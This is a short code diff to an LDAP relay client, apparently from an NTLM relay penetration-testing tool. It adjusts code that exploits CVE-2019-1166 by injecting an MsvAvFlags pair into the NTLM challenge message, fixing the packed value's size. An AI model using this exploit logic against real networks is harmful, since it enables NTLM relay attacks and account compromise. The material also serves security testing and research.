@@ -98,18 +98,16 @@ class LDAPRelayClient(ProtocolClient):
                     if result['result'] == RESULT_SUCCESS:
                         challenge = NTLMAuthChallenge()
                         challenge.fromString(result['server_creds'])
-                        # This section will exploit CVE-2019-1166 by injecting an 'msvAvFlag' into the CHALLENGE_MESSAGE with length 0x8
-                        # instead of length 0x4.
+                        # This section will exploit CVE-2019-1166 by injecting an 'msvAvFlag' into the CHALLENGE_MESSAGE.
                         if self.serverConfig.remove_mic:
                             av_pairs = AV_PAIRS(challenge['TargetInfoFields'])
-
-                            avFlagsPair = pack("<q", 0)
+                            avFlagsPair = pack("<I", 0)
                             new_av_pairs = AV_PAIRS()
                             new_av_pairs[NTLMSSP_AV_FLAGS] = avFlagsPair
 
                             for key in av_pairs.fields.keys():
                                 new_av_pairs[key] = av_pairs.fields.get(key)[1]
-                            
+
                             challenge['TargetInfoFields'] = new_av_pairs.getData()
                             challenge['TargetInfoFields_len'] = len(new_av_pairs.getData())
                             challenge['TargetInfoFields_max_len'] = len(new_av_pairs.getData())
